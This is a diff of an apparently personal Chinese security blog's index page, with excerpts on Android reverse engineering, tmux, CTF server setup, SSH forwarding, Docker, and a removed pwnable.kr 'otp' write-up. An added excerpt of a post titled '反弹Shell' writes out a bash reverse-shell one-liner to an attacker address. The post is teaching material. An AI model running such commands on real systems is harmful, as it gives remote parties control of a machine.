@@ -331,7 +331,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/28/ops/docker简介/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/08/android/android逆向准备工作/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -350,7 +350,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/09/28/ops/docker简介/" itemprop="url">docker简介</a></h2>
+                <a class="post-title-link" href="/2018/02/08/android/android逆向准备工作/" itemprop="url">android逆向准备工作</a></h2>
         
 
         <div class="post-meta">
@@ -362,8 +362,459 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-28T00:04:31+08:00">
-                2017-09-28
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-08T15:59:12+08:00">
+                2018-02-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/android/" itemprop="url" rel="index">
+                    <span itemprop="name">android</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+          0、笔者自述说实话，对于Android逆向，我还只处在开始调试开发的阶段，但是实在是受不了Android中的流氓软件以及流氓事件，我打算进行简单的安卓逆向。刚开始的目标是去除app中的广告页（现在发现十分困难）！
+1、安卓逆向的环境安装1.1 jdk安装jdk安装实在指导很多，但是这儿还是得提醒一句
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/02/08/android/android逆向准备工作/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/web/反弹Shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Introspelliam">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/09/web/反弹Shell/" itemprop="url">反弹Shell</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T23:53:55+08:00">
+                2017-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+          假设攻击端为10.0.0.1，接收端口为8080
+服务器端为10.0.0.2
+1、Bash关于bash中的重定向知识，可以参考shell之后的操作
+服务器端：
+1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
+1bash -c &apos;s
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/12/09/web/反弹Shell/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/tools/tmux使用教程/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Introspelliam">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/09/tools/tmux使用教程/" itemprop="url">tmux使用教程</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T17:25:01+08:00">
+                2017-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/tool/" itemprop="url" rel="index">
+                    <span itemprop="name">tool</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+          为什么要用 Tmuxtmux 在很多方面都很有用。就我而言，由于 tmux 允许随时随地断开或重新接入会话（Session），所以最大的作用就是在远程服务器上持久地保存工作状态。
+例如，你可以在服务器上新建一个会话并命名为“nodeapi”，然后用它来挖掘 node REST API 的漏洞（这是我
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/12/09/tools/tmux使用教程/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/ops/ctf运维的基本操作/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Introspelliam">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/09/ops/ctf运维的基本操作/" itemprop="url">ctf运维的基本操作</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T14:53:50+08:00">
+                2017-12-09
               </time>
             
 
@@ -424,34 +875,16 @@
       
         
           
-            <p>此文作为我以前一篇文章的裁剪，没有十分详尽地展现所有内容，对此我深感抱歉！</p>
-<h2 id="1-Docker容器技术"><a href="#1-Docker容器技术" class="headerlink" title="1 Docker容器技术"></a>1 Docker容器技术</h2><h3 id="1-1-Docker容器技术概述"><a href="#1-1-Docker容器技术概述" class="headerlink" title="1.1 Docker容器技术概述"></a>1.1 Docker容器技术概述</h3><p>Docker是一种新型的容器技术，已经在成为云计算的核心技术之一。Docker是为了解决依赖地域问题而产生的。Docker使用命名空间将各个容器进行隔离，并使用Namespace来对端口、层次进行隔离，使用AUFS技术进行分层并复用共同的层，以达到减少空间使用量。</p>
-<h3 id="1-2-Docker网络通信"><a href="#1-2-Docker网络通信" class="headerlink" title="1.2 Docker网络通信"></a>1.2 Docker网络通信</h3><p>Docker容器有以下几种网络模式。</p>
-<p>（1）    bridge模式</p>
-<p>使用—net=bridge指定，为Docker的默认设置。这种模式是将容器用docker的网桥连接起来。</p>
-<p>作为最常规的格式，bridge模式已经可以满足Docker容器最基本的使用需求。然而其在于外界通信使用NAT协议，增加了通信的复杂性，在复杂的场景下使用会有诸多限制。</p>
-<p>（2）    host模式</p>
-<p>host模式下，容器不会拥有自己的网络命名空间。Docker容器中的进程处于宿主机的网络环境中，此时Docker容器和宿主机之间网络没有映射关系，外界可以通过该主机的IP地址、端口等进行Docker容器的访问。当然，除了network namespace外，其他内容宿主机是隔离的。host模式不用地址映射，可以直接使用宿主机的IP。但是也降低了隔离性，而且由于网络资源一直被竞争，所以可能造成网络的短暂不可用问题。</p>
-<p>（3）    container模式</p>
-<p>container模式是指新创建的容器与已有的容器共享网络信息。在此种模式下，新创建的容器与指定的容器共享IP、端口等。当然，两个容器之间除了网络信息共享外，其它内容均不可共用。由于在这种模式下，两个容器的进程使用回环网卡通信，所以通讯速率加快了。container模式的主要用于部署多个相关的应用，最好能成为一个整体。由于container模式的特点，导致了这种模式隔离性不强，可能会存在安全隐患。</p>
-<p>（4）    none模式</p>
-<p>none模式时，Docker拥有网络协议栈，但是没有对协议栈进行配置。这时，Docker容器的网卡以及IP，均为用户所配置。一般而言，当未给使用这种模式的容器进行网络配置时，用户无法正常使用容器进程，但是优点也很明显，它给用户最大的自由度来自定义容器的网络环境。</p>
-<h3 id="1-3-Docker与传统虚拟化比较"><a href="#1-3-Docker与传统虚拟化比较" class="headerlink" title="1.3 Docker与传统虚拟化比较"></a>1.3 Docker与传统虚拟化比较</h3><p>Docker与传统的虚拟化技术有着不同，其容器是虚拟的是进程，而这些进程的依赖关系等都已经在布置容器时配置好。用户运行容器，就相当于直接利用宿主机的操作系统运行这些进程。而传统的虚拟化技术是重新虚拟一个操作系统，再在操作系统上运行这些程序进程。如图1所示，展现了Docker与传统虚拟化方式在实现上的不同。</p>
-<p>​      <img src="/images/2017-09-28/1.png" alt="">                       </p>
-<p>图 1 传统虚拟化技术和Docker比较</p>
-<p> 从图中可知，Docker与传统的虚拟化技术最大的区别是：传统的虚拟化技术是对操作系统的虚拟化；而Docker是复用了宿主机操作系统，相当于对应用的虚拟化。</p>
-<p>  当然，应用程序运行时的组合方式有很多，不局限于上面所讲到的两种。图2展示了可能的组合方式。</p>
-<p> <img src="/images/2017-09-28/2.png" alt=""></p>
-<p>图2 运行应用程序是可能的层次组合</p>
-<p> 当然，Docker容器技术越来越受各企业的青睐，原因是它比传统的虚拟化技术有更多的优势。首先，Docker容器技术使得其不需要创建虚拟机，而创建虚拟机所耗费的时间很长，这就间接地降低了容器的启动时长，当然容器技术也让创建容器、删除容器变得迅捷；其次，Docker可以打包每个组件及其依赖，因而Docker在很大程度上解决操作系统层面的冲突依赖、缺少依赖、平台依赖等依赖问题；最后，Docker能够充分利用系统资源，因为Docker较传统的虚拟化技术省却了最耗系统资源的操作系统。</p>
-<h3 id="1-4-Docker操作"><a href="#1-4-Docker操作" class="headerlink" title="1.4 Docker操作"></a>1.4 Docker操作</h3><p>Docker操作最主要的就是docker和docker daemon这两个部分，通过这两个部分，用户可以快速实现容器和镜像之间的操作。由于docke和docker daemon共用同一个二进制组件，所以docker在使用的时候一般需要root权限。</p>
-<p>从docker命令使用出发，梳理出如图3所示的命令结构图。</p>
-<p> <img src="/images/2017-09-28/3.png" alt=""></p>
-<p>图3 Docker命令结构图</p>
-<p>​       从图中可以看出，docker操作主要围绕着镜像和容器展开。通常创建可移植性的镜像，需要通过Dockerfile编写相应配置文件，然后创建之后打上标签，上传到Docker仓库中。下次需要运行时，只需要简单地将该镜像拉取至Docker宿主机上，然后运行即可。</p>
-<p>​       总而言之，Docker容器技术使得应用程序的可移植性大大增强，同时还为管理人员创建应用、启动应用、更新应用提供了方便。</p>
-
-          
+          1、ssh相关操作启动ssh（root亦可登录）
+12345service sshd startvi /etc/ssh/sshd_config- 取消PasswordAuthentication yes的注释- 将#PermitRootLogin prohibit-password后加入一行Perm
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/12/09/ops/ctf运维的基本操作/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -498,7 +931,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/27/pwn/ulimit在pwn题中的应用/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/07/web/ssh端口转发/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -517,7 +950,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/09/27/pwn/ulimit在pwn题中的应用/" itemprop="url">ulimit在pwn题中的应用</a></h2>
+                <a class="post-title-link" href="/2017/12/07/web/ssh端口转发/" itemprop="url">ssh端口转发</a></h2>
         
 
         <div class="post-meta">
@@ -529,928 +962,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-27T20:01:48+08:00">
-                2017-09-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1、ulimit简介"><a href="#1、ulimit简介" class="headerlink" title="1、ulimit简介"></a>1、ulimit简介</h3><p>Linux对于每个用户，系统限制其最大进程数。为提高性能，可以根据设备资源情况，设置各linux 用户的最大进程数</p>
-<p>可以用ulimit -a 来显示当前的各种用户进程限制。</p>
-<p>下表是我的虚拟机各个参数的限制</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">core file size          (blocks, -c) 0</div><div class="line">data seg size           (kbytes, -d) unlimited</div><div class="line">scheduling priority             (-e) 0</div><div class="line">file size               (blocks, -f) unlimited</div><div class="line">pending signals                 (-i) 7744</div><div class="line">max locked memory       (kbytes, -l) 64</div><div class="line">max memory size         (kbytes, -m) unlimited</div><div class="line">open files                      (-n) 1024</div><div class="line">pipe size            (512 bytes, -p) 8</div><div class="line">POSIX message queues     (bytes, -q) 819200</div><div class="line">real-time priority              (-r) 0</div><div class="line">stack size              (kbytes, -s) 8192</div><div class="line">cpu time               (seconds, -t) unlimited</div><div class="line">max user processes              (-u) 7744</div><div class="line">virtual memory          (kbytes, -v) unlimited</div><div class="line">file locks                      (-x) unlimited</div></pre></td></tr></table></figure>
-<h4 id="1-1-ulimit参数"><a href="#1-1-ulimit参数" class="headerlink" title="1.1 ulimit参数"></a>1.1 ulimit参数</h4><p>ulimit：显示（或设置）用户可以使用的资源的限制（limit），这限制分为软限制（当前限制）和硬限制（上限），其中硬限制是软限制的上限值，应用程序在运行过程中使用的系统资源不超过相应的软限制，任何的超越都导致进程的终止。</p>
-<p>参数 描述</p>
-<p>ulimited 不限制用户可以使用的资源，但本设置对可打开的最大文件数（max open files）和可同时运行的最大进程数（max user processes）无效</p>
-<p>-a 列出所有当前资源极限</p>
-<p>-c 设置core文件的最大值.单位:blocks</p>
-<p>-d 设置一个进程的数据段的最大值.单位:kbytes</p>
-<p>-f Shell 创建文件的文件大小的最大值，单位：blocks</p>
-<p>-h 指定设置某个给定资源的硬极限。如果用户拥有 root 用户权限，可以增大硬极限。任何用户均可减少硬极限</p>
-<p>-l 可以锁住的物理内存的最大值</p>
-<p>-m 可以使用的常驻内存的最大值,单位：kbytes</p>
-<p>-n 每个进程可以同时打开的最大文件数</p>
-<p>-p 设置管道的最大值，单位为block，1block=512bytes</p>
-<p>-s 指定堆栈的最大值：单位：kbytes</p>
-<p>-S 指定为给定的资源设置软极限。软极限可增大到硬极限的值。如果 -H 和 -S 标志均未指定，极限适用于以上二者</p>
-<p>-t 指定每个进程所使用的秒数,单位：seconds</p>
-<p>-u 可以运行的最大并发进程数</p>
-<p>-v Shell可使用的最大的虚拟内存，单位：kbytes</p>
-<font color="#f00">用ulimit -s unlimited 就可以关闭aslr</font>
-
-<h4 id="1-2-ulimit设置【临时】"><a href="#1-2-ulimit设置【临时】" class="headerlink" title="1.2 ulimit设置【临时】"></a>1.2 ulimit设置【临时】</h4><p>其他建议设置成无限制（unlimited）的一些重要设置是：</p>
-<p>数据段长度：ulimit -d unlimited</p>
-<p>最大内存大小：ulimit -m unlimited</p>
-<p>堆栈大小：ulimit -s unlimited</p>
-<p>CPU 时间：ulimit -t unlimited</p>
-<p>虚拟内存：ulimit -v unlimited</p>
-<p>暂时地，适用于通过 ulimit 命令登录 shell 会话期间。</p>
-<h4 id="1-3-永久设置相关选项【永久】"><a href="#1-3-永久设置相关选项【永久】" class="headerlink" title="1.3 永久设置相关选项【永久】"></a>1.3 永久设置相关选项【永久】</h4><p>永久地，通过将一个相应的 ulimit 语句添加到由登录 shell 读取的文件中， 即特定于 shell 的用户资源文件，如：</p>
-<ul>
-<li>解除 Linux 系统的最大进程数和最大文件打开数限制：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">vi /etc/security/limits.conf</div><div class="line"># 添加如下的行</div><div class="line">* soft noproc 11000</div><div class="line">* hard noproc 11000</div><div class="line">* soft nofile 4100</div><div class="line">* hard nofile 4100</div></pre></td></tr></table></figure>
-<p>​        # 添加如下的行</p>
-<p>​        * soft noproc 11000</p>
-<p>​        * hard noproc 11000</p>
-<p>​        * soft nofile 4100</p>
-<p>​        * hard nofile 4100</p>
-<p>​       说明：* 代表针对所有用户，noproc 是代表最大进程数，nofile 是代表最大文件打开数</p>
-<ul>
-<li>让 SSH 接受 Login 程式的登入，方便在 ssh 客户端查看 ulimit -a 资源限制：</li>
-</ul>
-<p>​        a、vi /etc/ssh/sshd_config</p>
-<p>​             把 UserLogin 的值改为 yes，并把 # 注释去掉</p>
-<p>​        b、重启 sshd 服务：</p>
-<p>​              /etc/init.d/sshd restart</p>
-<ul>
-<li><p>修改所有 linux 用户的环境变量文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">vi /etc/profile</div><div class="line">ulimit -u 10000</div><div class="line">ulimit -n 4096</div><div class="line">ulimit -d unlimited</div><div class="line">ulimit -m unlimited</div><div class="line">ulimit -s unlimited</div><div class="line">ulimit -t unlimited</div><div class="line">ulimit -v unlimited</div></pre></td></tr></table></figure>
-<p>保存后运行#source /etc/profile 使其生效</p>
-</li>
-<li><p>解除程序能打开的文件个数限制</p>
-</li>
-</ul>
-<p>有时候在程序里面需要打开多个文件，进行分析，系统一般默认数量是1024，（用ulimit -a可以看到）对于正常使用是够了，但是对于程序来讲，就太少了。</p>
-<p>修改2个文件。</p>
-<ol>
-<li>/etc/security/limits.conf</li>
-</ol>
-<p>vi /etc/security/limits.conf</p>
-<p>加上：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">* soft nofile 8192</div><div class="line">* hard nofile 20480</div></pre></td></tr></table></figure>
-<ol start="2">
-<li>/etc/pam.d/login</li>
-</ol>
-<p>session required /lib/security/pam_limits.so</p>
-<p>另外确保/etc/pam.d/system-auth文件有下面内容</p>
-<p>session required /lib/security/$ISA/pam_limits.so</p>
-<p>这一行确保系统会执行这个限制。</p>
-<ol start="3">
-<li>一般用户的.bash_profile</li>
-</ol>
-<p>#ulimit -n 1024</p>
-<p>重新登陆ok</p>
-<h3 id="2、ulimit在pwn中的应用"><a href="#2、ulimit在pwn中的应用" class="headerlink" title="2、ulimit在pwn中的应用"></a>2、ulimit在pwn中的应用</h3><p>说到ulimit在pwn中的应用，这里就不得不提到pwnable.kr上的一道题otp：</p>
-<p>题目描述如下</p>
-<blockquote>
-<p>I made a skeleton interface for one time password authentication system.<br>I guess there are no mistakes.<br>could you take a look at it?</p>
-<p>hint : not a race condition. do not bruteforce.</p>
-<p>ssh <a href="mailto:otp@pwnable.kr" target="_blank" rel="external">otp@pwnable.kr</a> -p2222 (pw:guest)</p>
-</blockquote>
-<p>该题已经给出了源码！通过源码以及既定的思维方式，一般很难找到这题的利用方法。这题的利用方式就是用ulimit设置文件size的最大值。</p>
-<p>otp.c源码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> fname[<span class="number">128</span>];</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> otp[<span class="number">2</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"usage : ./otp [passcode]\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</div><div class="line">    <span class="keyword">if</span>(fd==<span class="number">-1</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(read(fd, otp, <span class="number">16</span>)!=<span class="number">16</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">    close(fd);</div><div class="line"></div><div class="line">    <span class="built_in">sprintf</span>(fname, <span class="string">"/tmp/%llu"</span>, otp[<span class="number">0</span>]);</div><div class="line">    FILE* fp = fopen(fname, <span class="string">"w"</span>);</div><div class="line">    <span class="keyword">if</span>(fp==<span class="literal">NULL</span>)&#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;</div><div class="line">    fwrite(&amp;otp[<span class="number">1</span>], <span class="number">8</span>, <span class="number">1</span>, fp);</div><div class="line">    fclose(fp);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"OTP generated.\n"</span>);</div><div class="line"></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> passcode=<span class="number">0</span>;</div><div class="line">    FILE* fp2 = fopen(fname, <span class="string">"r"</span>);</div><div class="line">    <span class="keyword">if</span>(fp2==<span class="literal">NULL</span>)&#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;</div><div class="line">    fread(&amp;passcode, <span class="number">8</span>, <span class="number">1</span>, fp2);</div><div class="line">    fclose(fp2);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(strtoul(argv[<span class="number">1</span>], <span class="number">0</span>, <span class="number">16</span>) == passcode)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</div><div class="line">        system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"OTP mismatch\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    unlink(fname);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>exp.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> subprocess</div><div class="line">subprocess.Popen([<span class="string">'/home/otp/otp'</span>, <span class="string">''</span>], stderr=subprocess.STDOUT)</div></pre></td></tr></table></figure>
-<p>利用</p>
-<blockquote>
-<p>otp@ubuntu:~$ ulimit -f 0<br>otp@ubuntu:~$ python /tmp/otp/exp.py<br>otp@ubuntu:~$ OTP generated.<br>Congratz!<br>Darn... I always forget to check the return value of fclose() :(</p>
-</blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/26/pwn/控制eip的方法/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/26/pwn/控制eip的方法/" itemprop="url">控制eip的方法</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-26T20:36:33+08:00">
-                2017-09-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
